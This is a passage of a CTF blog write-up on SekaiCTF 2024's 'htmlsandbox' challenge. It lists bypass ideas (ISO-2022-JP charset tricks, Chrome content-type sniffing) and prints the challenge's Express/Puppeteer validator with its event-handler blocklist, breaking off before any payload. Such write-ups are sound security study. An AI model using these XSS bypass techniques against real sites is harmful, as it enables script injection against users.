<!doctype html><html xmlns=http://www.w3.org/1999/xhtml xml:lang=en-us lang=en-us data-decrypt-overlay-text="0xAlessandro's blog" data-decrypt-overlay-duration=1500 data-decrypt-overlay-step=24><head><script defer language=javascript type=text/javascript src=/js/bundle.min.7412ed342dc965a38dbe3f8721a1216d64dc1900d8a57735ec72cc9182e2113f.js></script><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><link rel=icon href=/favicon.png><title itemprop=name>CTF BLOG - SekaiCTF 2024</title><meta property="og:title" content="CTF BLOG - SekaiCTF 2024"><meta name=twitter:title content="CTF BLOG - SekaiCTF 2024"><meta itemprop=name content="CTF BLOG - SekaiCTF 2024"><meta name=application-name content="CTF BLOG - SekaiCTF 2024"><meta property="og:site_name" content><meta name=description content><meta itemprop=description content><meta property="og:description" content><meta name=twitter:description content><base href=https://0xAlessandro.github.io/posts/sekai/><link rel=canonical href=https://0xAlessandro.github.io/posts/sekai/ itemprop=url><meta name=url content="https://0xAlessandro.github.io/posts/sekai/"><meta name=twitter:url content="https://0xAlessandro.github.io/posts/sekai/"><meta property="og:url" content="https://0xAlessandro.github.io/posts/sekai/"><meta property="og:updated_time" content="2024-08-29T00:00:00Z"><link rel=sitemap type=application/xml title=Sitemap href=https://0xAlessandro.github.io/sitemap.xml><meta name=robots content="index,follow"><meta name=googlebot content="index,follow"><meta name=twitter:site content="@0xal3ssandro"><meta name=twitter:creator content="@0xal3ssandro"><meta property="fb:admins" content><meta name=apple-mobile-web-app-title content><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black"><meta name=generator content="Hugo 0.114.0"><link type=text/css rel=stylesheet href=/css/bundle.min.7ecc576b8e28f4abe2b8950b185a25e7c166a0eea02f16a9227dc9456c51481c.css><style>body{--sidebar-bg-color:#202020;--sidebar-img-border-color:#515151;--sidebar-p-color:#909090;--sidebar-h1-color:#FFF;--sidebar-a-color:#FFF;--sidebar-socials-color:#FFF;--text-color:#222;--bkg-color:#FAF9F6;--post-title-color:#303030;--list-color:#5a5a5a;--link-color:#268bd2;--date-color:#515151;--table-border-color:#E5E5E5;--table-stripe-color:#F9F9F9;--code-color:#000;--code-background-color:#E5E5E5;--code-block-color:#fff;--code-block-background-color:#272822;--moon-sun-color:#FFF;--moon-sun-background-color:#515151}body.dark-theme{--text-color:#eee;--bkg-color:#121212;--post-title-color:#DBE2E9;--list-color:#9d9d9d;--link-color:#268bd2;--date-color:#9a9a9a;--table-border-color:#515151;--table-stripe-color:#202020;--code-color:#fff;--code-background-color:#515151;--code-block-color:#fff;--code-block-background-color:#272822}body{background-color:var(--bkg-color)}</style></head><body class=dark-theme><div class=wrapper><aside class=sidebar><div class="container sidebar-sticky"><div class=light-dark align=right><button class=btn-light-dark title="Toggle light/dark mode"><svg class="moon" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M6 .278a.768.768.0 01.08.858 7.208 7.208.0 00-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527.0 1.04-.055 1.533-.16a.787.787.0 01.81.316.733.733.0 01-.031.893A8.349 8.349.0 018.344 16C3.734 16 0 12.286.0 7.71.0 4.266 2.114 1.312 5.124.06A.752.752.0 016 .278z"/></svg><svg class="sun" xmlns="http://www.w3.org/2000/svg" width="1em" height="1em" viewBox="0 0 16 16"><path fill="currentcolor" d="M8 12a4 4 0 100-8 4 4 0 000 8zM8 0a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 0zm0 13a.5.5.0 01.5.5v2a.5.5.0 01-1 0v-2A.5.5.0 018 13zm8-5a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2a.5.5.0 01.5.5zM3 8a.5.5.0 01-.5.5h-2a.5.5.0 010-1h2A.5.5.0 013 8zm10.657-5.657a.5.5.0 010 .707l-1.414 1.415a.5.5.0 11-.707-.708l1.414-1.414a.5.5.0 01.707.0zm-9.193 9.193a.5.5.0 010 .707L3.05 13.657a.5.5.0 01-.707-.707l1.414-1.414a.5.5.0 01.707.0zm9.193 2.121a.5.5.0 01-.707.0l-1.414-1.414a.5.5.0 01.707-.707l1.414 1.414a.5.5.0 010 .707zM4.464 4.465a.5.5.0 01-.707.0L2.343 3.05a.5.5.0 11.707-.707l1.414 1.414a.5.5.0 010 .708z"/></svg></button></div><div class=sidebar-about><h1 class=brand><a href=https://0xAlessandro.github.io/><img src=/images/rm-rf.png alt="brand image"></a>
<a href=https://0xAlessandro.github.io/><h1 data-decrypt data-text="CTF BLOG">CTF BLOG</h1></a></h1><p class=lead>Welcome, This is 0xAlessandro's ctf blog</p></div><nav><ul class=sidebar-nav><li class=heading><a href=/about/>About</a></li><li class=heading><a href=/posts/>Posts</a></li><li class=sub-heading>Recent</li><li class=bullet><a href=https://0xAlessandro.github.io/posts/twitter-chall/>Twitter Chall</a></li><li class=bullet><a href=https://0xAlessandro.github.io/posts/sekai/>SekaiCTF 2024</a></li></ul></nav><a target=_blank class=social title=GitHub href=https://github.com/0xAlessandro><svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="-2 -2 24 24"><path fill="currentcolor" d="M18.88 1.099C18.147.366 17.265.0 16.233.0H3.746C2.714.0 1.832.366 1.099 1.099.366 1.832.0 2.714.0 3.746v12.487c0 1.032.366 1.914 1.099 2.647.733.733 1.615 1.099 2.647 1.099H6.66c.19.0.333-.007.429-.02a.504.504.0 00.286-.169c.095-.1.143-.245.143-.435l-.007-.885c-.004-.564-.006-1.01-.006-1.34l-.3.052c-.19.035-.43.05-.721.046a5.555 5.555.0 01-.904-.091 2.026 2.026.0 01-.872-.39 1.651 1.651.0 01-.572-.8l-.13-.3a3.25 3.25.0 00-.41-.663c-.186-.243-.375-.407-.566-.494l-.09-.065a.956.956.0 01-.17-.156.723.723.0 01-.117-.182c-.026-.061-.004-.111.065-.15.07-.04.195-.059.378-.059l.26.04c.173.034.388.138.643.311a2.1 2.1.0 01.631.677c.2.355.44.626.722.813.282.186.566.28.852.28.286.0.533-.022.742-.065a2.59 2.59.0 00.585-.196c.078-.58.29-1.028.637-1.34a8.907 8.907.0 01-1.333-.234 5.314 5.314.0 01-1.223-.507 3.5 3.5.0 01-1.047-.872c-.277-.347-.505-.802-.683-1.365-.177-.564-.266-1.215-.266-1.952.0-1.049.342-1.942 1.027-2.68-.32-.788-.29-1.673.091-2.652.252-.079.625-.02 1.119.175.494.195.856.362 1.086.5.23.14.414.257.553.352a9.233 9.233.0 012.497-.338c.859.0 1.691.113 2.498.338l.494-.312a6.997 6.997.0 011.197-.572c.46-.174.81-.221 1.054-.143.39.98.424 1.864.103 2.653.685.737 1.028 1.63 1.028 2.68.0.737-.089 1.39-.267 1.957-.177.568-.407 1.023-.689 1.366a3.65 3.65.0 01-1.053.865c-.42.234-.828.403-1.223.507a8.9 8.9.0 01-1.333.235c.45.39.676 1.005.676 1.846v3.11c0 .147.021.266.065.357a.36.36.0 00.208.189c.096.034.18.056.254.064.074.01.18.013.318.013h2.914c1.032.0 1.914-.366 2.647-1.099.732-.732 1.099-1.615 1.099-2.647V3.746c0-1.032-.367-1.914-1.1-2.647z"/></svg></a><a target=_blank class=social title=Twitter href=https://x.com/0xal3ssandro><svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 16 16"><path fill="currentcolor" d="M5.032 14.286c6.037.0 9.34-4.837 9.34-9.032.0-.137.0-.274-.01-.41A6.56 6.56.0 0016 3.2c-.6.256-1.235.425-1.885.5a3.207 3.207.0 001.443-1.757c-.645.37-1.35.63-2.085.77a3.322 3.322.0 00-1.862-.958 3.384 3.384.0 00-2.082.334 3.223 3.223.0 00-1.442 1.49 3.08 3.08.0 00-.208 2.03 9.57 9.57.0 01-3.747-.963A9.269 9.269.0 011.114 2.292a3.086 3.086.0 00-.36 2.314c.189.787.68 1.475 1.376 1.924A3.344 3.344.0 01.64 6.132v.04c0 .734.263 1.444.743 2.01a3.3 3.3.0 001.89 1.102c-.483.128-.99.146-1.482.055a3.19 3.19.0 001.168 1.577 3.36 3.36.0 001.9.627A6.732 6.732.0 010 12.86a9.527 9.527.0 005.032 1.423"/></svg></a><a target=_blank class=social title=Discord href=https://discordapp.com/users/649350001079615491><svg xmlns="http://www.w3.org/2000/svg" width="1.2em" height="1.2em" viewBox="0 0 24 24"><path fill="currentcolor" d="M19.27 5.33C17.94 4.71 16.5 4.26 15 4a.09.09.0 00-.07.03c-.18.33-.39.76-.53 1.09a16.09 16.09.0 00-4.8.0c-.14-.34-.35-.76-.54-1.09-.01-.02-.04-.03-.07-.03-1.5.26-2.93.71-4.27 1.33-.01.0-.02.01-.03.02-2.72 4.07-3.47 8.03-3.1 11.95.0.02.01.04.03.05 1.8 1.32 3.53 2.12 5.24 2.65.03.01.06.0.07-.02.4-.55.76-1.13 1.07-1.74.02-.04.0-.08-.04-.09-.57-.22-1.11-.48-1.64-.78-.04-.02-.04-.08-.01-.11.11-.08.22-.17.33-.25.02-.02.05-.02.07-.01 3.44 1.57 7.15 1.57 10.55.0.02-.01.05-.01.07.01.11.09.22.17.33.26.04.03.04.09-.01.11-.52.31-1.07.56-1.64.78-.04.01-.05.06-.04.09.32.61.68 1.19 1.07 1.74.03.01.06.02.09.01 1.72-.53 3.45-1.33 5.25-2.65.02-.01.03-.03.03-.05.44-4.53-.73-8.46-3.1-11.95-.01-.01-.02-.02-.04-.02zM8.52 14.91c-1.03.0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06.0 1.9.96 1.89 2.12.0 1.17-.84 2.12-1.89 2.12zm6.97.0c-1.03.0-1.89-.95-1.89-2.12s.84-2.12 1.89-2.12c1.06.0 1.9.96 1.89 2.12.0 1.17-.83 2.12-1.89 2.12z"/></svg></a><a target=_blank class=social title="RSS Feed" href=/posts/index.xml><svg xmlns="http://www.w3.org/2000/svg" width="1em" height="1.2em" viewBox="0 0 1280 1280"><g transform="translate(0.000000,1280.000000) scale(0.100000,-0.100000)" fill="currentcolor"><path d="M2295 11929c-284-12-642-45-707-65-17-5-18-63-18-1039 0-569 4-1036 8-1039 5-3 74 6 153 19 510 86 1168 95 1789 25 1348-153 2602-677 3670-1531 385-308 820-744 1126-1129 842-1060 1362-2313 1514-3650 70-621 61-1279-25-1789-13-79-22-148-19-153 3-4 471-8 1039-8h1035l5 23c51 225 85 942 67 1419-23 605-77 1044-198 1617-294 14e2-927 2734-1823 3846-1043 1295-2364 2259-3909 2854-1158 447-2451 656-3707 6e2z"/><path d="M2255 7845c-269-25-620-81-667-106-17-9-18-55-18-899 0-706 3-890 13-890 6 0 66 18 132 41 130 44 288 79 467 105 154 21 577 30 749 15 1207-107 2267-823 2814-1902 166-327 268-637 330-1001 38-227 48-384 42-662-8-348-44-590-126-831-23-66-41-126-41-132 0-10 184-13 890-13 844 0 890 1 899 18 27 50 88 452 110 725 14 162 14 624 1 782-59 703-233 1323-545 1945-481 956-1313 1788-2270 2268-620 310-1239 483-1940 542-165 14-669 10-840-5z"/><path d="M2519 3815c-391-66-725-336-868-703-79-201-96-462-45-677 83-344 338-641 666-774 116-47 205-69 330-80 412-39 811 153 1040 5e2 193 292 240 648 128 981-135 403-492 699-914 757-1e2 14-241 12-337-4z"/></g></svg></a><p class=footnote>powered by <a target=_blank href=https://gohugo.io>Hugo</a> | themed with <a target=_blank href=https://github.com/lukeorth/poison>poison</a><br>&copy; 2025 . All rights reserved.</p></div></aside><main class="content container"><div class=post><div class=info><h1 class=post-title><a href=https://0xAlessandro.github.io/posts/sekai/>SekaiCTF 2024</a></h1><div class=headline><div><time datetime=" 2024-08-29T00:00:00Z" class=post-date>August 29, 2024</time>
<span>-</span>
<span class=reading-time><span>12 mins read</span></span></div><ul class=tags><li class=tag-xss><a href=/tags/xss/>xss</a></li><li class=tag-chrome><a href=/tags/chrome/>chrome</a></li><li class=tag-SekaiCTF><a href=/tags/sekaictf/>SekaiCTF</a></li><li class=tag-htmlsandbox><a href=/tags/htmlsandbox/>htmlsandbox</a></li></ul></div></div><h1 id=htmlsandbox>HTMLSANDBOX</h1><p>KEY POINT</p><ul><li>Create arbitrary html documents but you have to:</li><li>Set csp to default-src none</li><li>Event handlers and tags massive blacklist</li><li>Content-Type miss charset informations</li><li>ISO-2022-JP shenigans</li><li>Chrome content-type sniffing</li></ul><p><img src=/images/sekai/1.png alt=1.png></p><p>So we have a simple webapp which enables us to upload html webapp, here’s the code.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-jsx data-lang=jsx><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>express</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;express&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>puppeteer</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;puppeteer&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>redis</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;redis&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crypto</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;node:crypto&#39;</span>);
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>path</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>require</span>(<span style=color:#e6db74>&#39;node:path&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EVENTS</span> <span style=color:#f92672>=</span> [<span style=color:#e6db74>&#34;onsearch&#34;</span>,<span style=color:#e6db74>&#34;onappinstalled&#34;</span>,<span style=color:#e6db74>&#34;onbeforeinstallprompt&#34;</span>,<span style=color:#e6db74>&#34;onbeforexrselect&#34;</span>,<span style=color:#e6db74>&#34;onabort&#34;</span>,<span style=color:#e6db74>&#34;onbeforeinput&#34;</span>,<span style=color:#e6db74>&#34;onbeforematch&#34;</span>,<span style=color:#e6db74>&#34;onbeforetoggle&#34;</span>,<span style=color:#e6db74>&#34;onblur&#34;</span>,<span style=color:#e6db74>&#34;oncancel&#34;</span>,<span style=color:#e6db74>&#34;oncanplay&#34;</span>,<span style=color:#e6db74>&#34;oncanplaythrough&#34;</span>,<span style=color:#e6db74>&#34;onchange&#34;</span>,<span style=color:#e6db74>&#34;onclick&#34;</span>,<span style=color:#e6db74>&#34;onclose&#34;</span>,<span style=color:#e6db74>&#34;oncontentvisibilityautostatechange&#34;</span>,<span style=color:#e6db74>&#34;oncontextlost&#34;</span>,<span style=color:#e6db74>&#34;oncontextmenu&#34;</span>,<span style=color:#e6db74>&#34;oncontextrestored&#34;</span>,<span style=color:#e6db74>&#34;oncuechange&#34;</span>,<span style=color:#e6db74>&#34;ondblclick&#34;</span>,<span style=color:#e6db74>&#34;ondrag&#34;</span>,<span style=color:#e6db74>&#34;ondragend&#34;</span>,<span style=color:#e6db74>&#34;ondragenter&#34;</span>,<span style=color:#e6db74>&#34;ondragleave&#34;</span>,<span style=color:#e6db74>&#34;ondragover&#34;</span>,<span style=color:#e6db74>&#34;ondragstart&#34;</span>,<span style=color:#e6db74>&#34;ondrop&#34;</span>,<span style=color:#e6db74>&#34;ondurationchange&#34;</span>,<span style=color:#e6db74>&#34;onemptied&#34;</span>,<span style=color:#e6db74>&#34;onended&#34;</span>,<span style=color:#e6db74>&#34;onerror&#34;</span>,<span style=color:#e6db74>&#34;onfocus&#34;</span>,<span style=color:#e6db74>&#34;onformdata&#34;</span>,<span style=color:#e6db74>&#34;oninput&#34;</span>,<span style=color:#e6db74>&#34;oninvalid&#34;</span>,<span style=color:#e6db74>&#34;onkeydown&#34;</span>,<span style=color:#e6db74>&#34;onkeypress&#34;</span>,<span style=color:#e6db74>&#34;onkeyup&#34;</span>,<span style=color:#e6db74>&#34;onload&#34;</span>,<span style=color:#e6db74>&#34;onloadeddata&#34;</span>,<span style=color:#e6db74>&#34;onloadedmetadata&#34;</span>,<span style=color:#e6db74>&#34;onloadstart&#34;</span>,<span style=color:#e6db74>&#34;onmousedown&#34;</span>,<span style=color:#e6db74>&#34;onmouseenter&#34;</span>,<span style=color:#e6db74>&#34;onmouseleave&#34;</span>,<span style=color:#e6db74>&#34;onmousemove&#34;</span>,<span style=color:#e6db74>&#34;onmouseout&#34;</span>,<span style=color:#e6db74>&#34;onmouseover&#34;</span>,<span style=color:#e6db74>&#34;onmouseup&#34;</span>,<span style=color:#e6db74>&#34;onmousewheel&#34;</span>,<span style=color:#e6db74>&#34;onpause&#34;</span>,<span style=color:#e6db74>&#34;onplay&#34;</span>,<span style=color:#e6db74>&#34;onplaying&#34;</span>,<span style=color:#e6db74>&#34;onprogress&#34;</span>,<span style=color:#e6db74>&#34;onratechange&#34;</span>,<span style=color:#e6db74>&#34;onreset&#34;</span>,<span style=color:#e6db74>&#34;onresize&#34;</span>,<span style=color:#e6db74>&#34;onscroll&#34;</span>,<span style=color:#e6db74>&#34;onsecuritypolicyviolation&#34;</span>,<span style=color:#e6db74>&#34;onseeked&#34;</span>,<span style=color:#e6db74>&#34;onseeking&#34;</span>,<span style=color:#e6db74>&#34;onselect&#34;</span>,<span style=color:#e6db74>&#34;onslotchange&#34;</span>,<span style=color:#e6db74>&#34;onstalled&#34;</span>,<span style=color:#e6db74>&#34;onsubmit&#34;</span>,<span style=color:#e6db74>&#34;onsuspend&#34;</span>,<span style=color:#e6db74>&#34;ontimeupdate&#34;</span>,<span style=color:#e6db74>&#34;ontoggle&#34;</span>,<span style=color:#e6db74>&#34;onvolumechange&#34;</span>,<span style=color:#e6db74>&#34;onwaiting&#34;</span>,<span style=color:#e6db74>&#34;onwebkitanimationend&#34;</span>,<span style=color:#e6db74>&#34;onwebkitanimationiteration&#34;</span>,<span style=color:#e6db74>&#34;onwebkitanimationstart&#34;</span>,<span style=color:#e6db74>&#34;onwebkittransitionend&#34;</span>,<span style=color:#e6db74>&#34;onwheel&#34;</span>,<span style=color:#e6db74>&#34;onauxclick&#34;</span>,<span style=color:#e6db74>&#34;ongotpointercapture&#34;</span>,<span style=color:#e6db74>&#34;onlostpointercapture&#34;</span>,<span style=color:#e6db74>&#34;onpointerdown&#34;</span>,<span style=color:#e6db74>&#34;onpointermove&#34;</span>,<span style=color:#e6db74>&#34;onpointerrawupdate&#34;</span>,<span style=color:#e6db74>&#34;onpointerup&#34;</span>,<span style=color:#e6db74>&#34;onpointercancel&#34;</span>,<span style=color:#e6db74>&#34;onpointerover&#34;</span>,<span style=color:#e6db74>&#34;onpointerout&#34;</span>,<span style=color:#e6db74>&#34;onpointerenter&#34;</span>,<span style=color:#e6db74>&#34;onpointerleave&#34;</span>,<span style=color:#e6db74>&#34;onselectstart&#34;</span>,<span style=color:#e6db74>&#34;onselectionchange&#34;</span>,<span style=color:#e6db74>&#34;onanimationend&#34;</span>,<span style=color:#e6db74>&#34;onanimationiteration&#34;</span>,<span style=color:#e6db74>&#34;onanimationstart&#34;</span>,<span style=color:#e6db74>&#34;ontransitionrun&#34;</span>,<span style=color:#e6db74>&#34;ontransitionstart&#34;</span>,<span style=color:#e6db74>&#34;ontransitionend&#34;</span>,<span style=color:#e6db74>&#34;ontransitioncancel&#34;</span>,<span style=color:#e6db74>&#34;onafterprint&#34;</span>,<span style=color:#e6db74>&#34;onbeforeprint&#34;</span>,<span style=color:#e6db74>&#34;onbeforeunload&#34;</span>,<span style=color:#e6db74>&#34;onhashchange&#34;</span>,<span style=color:#e6db74>&#34;onlanguagechange&#34;</span>,<span style=color:#e6db74>&#34;onmessage&#34;</span>,<span style=color:#e6db74>&#34;onmessageerror&#34;</span>,<span style=color:#e6db74>&#34;onoffline&#34;</span>,<span style=color:#e6db74>&#34;ononline&#34;</span>,<span style=color:#e6db74>&#34;onpagehide&#34;</span>,<span style=color:#e6db74>&#34;onpageshow&#34;</span>,<span style=color:#e6db74>&#34;onpopstate&#34;</span>,<span style=color:#e6db74>&#34;onrejectionhandled&#34;</span>,<span style=color:#e6db74>&#34;onstorage&#34;</span>,<span style=color:#e6db74>&#34;onunhandledrejection&#34;</span>,<span style=color:#e6db74>&#34;onunload&#34;</span>,<span style=color:#e6db74>&#34;onpageswap&#34;</span>,<span style=color:#e6db74>&#34;onpagereveal&#34;</span>,<span style=color:#e6db74>&#34;onoverscroll&#34;</span>,<span style=color:#e6db74>&#34;onscrollend&#34;</span>,<span style=color:#e6db74>&#34;onscrollsnapchange&#34;</span>,<span style=color:#e6db74>&#34;onscrollsnapchanging&#34;</span>,<span style=color:#e6db74>&#34;ontimezonechange&#34;</span>];
</span></span><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>EVENT_SELECTOR</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>EVENTS</span>.<span style=color:#a6e22e>map</span>(<span style=color:#a6e22e>e</span>=&gt;<span style=color:#e6db74>`*[</span><span style=color:#e6db74>${</span><span style=color:#a6e22e>e</span><span style=color:#e6db74>}</span><span style=color:#e6db74>]`</span>).<span style=color:#a6e22e>join</span>(<span style=color:#e6db74>&#39;,&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>client</span>;
</span></span><span style=display:flex><span><span style=color:#66d9ef>let</span> <span style=color:#a6e22e>browser</span>;
</span></span><span style=display:flex><span>(<span style=color:#66d9ef>async</span> () =&gt; {
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>browser</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>puppeteer</span>.<span style=color:#a6e22e>launch</span>({
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>headless</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>false</span>,
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>pipe</span><span style=color:#f92672>:</span> <span style=color:#66d9ef>true</span>,
</span></span><span style=display:flex><span>        <span style=color:#75715e>//dumpio: true,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#a6e22e>args</span><span style=color:#f92672>:</span> [
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;--incognito&#39;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--no-sandbox&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--disable-setuid-sandbox&#34;</span>,
</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;--js-flags=--noexpose_wasm,--jitless&#34;</span>,
</span></span><span style=display:flex><span>        ]
</span></span><span style=display:flex><span>    });
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;init browser&#39;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>client</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>redis</span>.<span style=color:#a6e22e>createClient</span>({ <span style=color:#a6e22e>url</span><span style=color:#f92672>:</span> <span style=color:#e6db74>`redis://default@0.0.0.0:6379`</span> })
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;error&#39;</span>, <span style=color:#a6e22e>err</span> =&gt; <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;Redis Client Error&#39;</span>, <span style=color:#a6e22e>err</span>))
</span></span><span style=display:flex><span>        .<span style=color:#a6e22e>connect</span>();
</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>&#39;redis connected&#39;</span>);
</span></span><span style=display:flex><span>})()
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>async</span> <span style=color:#66d9ef>function</span> <span style=color:#a6e22e>validate</span>(<span style=color:#a6e22e>url</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>valid</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>context</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>context</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>browser</span>.<span style=color:#a6e22e>createBrowserContext</span>();
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>page</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>context</span>.<span style=color:#a6e22e>newPage</span>();
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setDefaultTimeout</span>(<span style=color:#ae81ff>2000</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// no shenanigans!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setJavaScriptEnabled</span>(<span style=color:#66d9ef>false</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#75715e>// disallow making any requests
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>setRequestInterception</span>(<span style=color:#66d9ef>true</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>let</span> <span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>on</span>(<span style=color:#e6db74>&#39;request&#39;</span>, <span style=color:#a6e22e>interceptedRequest</span> =&gt; {
</span></span><span style=display:flex><span>            <span style=color:#a6e22e>reqCount</span><span style=color:#f92672>++</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#a6e22e>isInterceptResolutionHandled</span>()) <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>if</span> (<span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>1</span>) {
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#a6e22e>abort</span>();
</span></span><span style=display:flex><span>            }
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>else</span>
</span></span><span style=display:flex><span>                <span style=color:#a6e22e>interceptedRequest</span>.<span style=color:#66d9ef>continue</span>();
</span></span><span style=display:flex><span>        });
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`visiting </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>url</span><span style=color:#e6db74>}</span><span style=color:#e6db74>...`</span>);
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#66d9ef>goto</span>(<span style=color:#a6e22e>url</span>, { <span style=color:#a6e22e>timeout</span><span style=color:#f92672>:</span> <span style=color:#ae81ff>3000</span>, <span style=color:#a6e22e>waitUntil</span><span style=color:#f92672>:</span> <span style=color:#e6db74>&#39;domcontentloaded&#39;</span> });
</span></span><span style=display:flex><span>        <span style=color:#a6e22e>valid</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>page</span>.<span style=color:#a6e22e>evaluate</span>((<span style=color:#a6e22e>s</span>) =&gt; {
</span></span><span style=display:flex><span>            <span style=color:#75715e>// check CSP tag is at the start
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// check no script tags or frames
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#75715e>// check no event handlers
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>            <span style=color:#66d9ef>return</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#39;head&#39;</span>).<span style=color:#a6e22e>firstElementChild</span>.<span style=color:#a6e22e>outerHTML</span> <span style=color:#f92672>===</span> <span style=color:#e6db74>`&lt;meta http-equiv=&#34;Content-Security-Policy&#34; content=&#34;default-src &#39;none&#39;&#34;&gt;`</span>
</span></span><span style=display:flex><span>                <span style=color:#f92672>&amp;&amp;</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#e6db74>&#39;script, noscript, frame, iframe, object, embed&#39;</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>null</span> <span style=color:#f92672>&amp;&amp;</span> document.<span style=color:#a6e22e>querySelector</span>(<span style=color:#a6e22e>s</span>) <span style=color:#f92672>===</span> <span style=color:#66d9ef>null</span>
</span></span><span style=display:flex><span>        }, <span style=color:#a6e22e>EVENT_SELECTOR</span>) <span style=color:#f92672>&amp;&amp;</span> <span style=color:#a6e22e>reqCount</span> <span style=color:#f92672>===</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>catch</span> (<span style=color:#a6e22e>e</span>) {
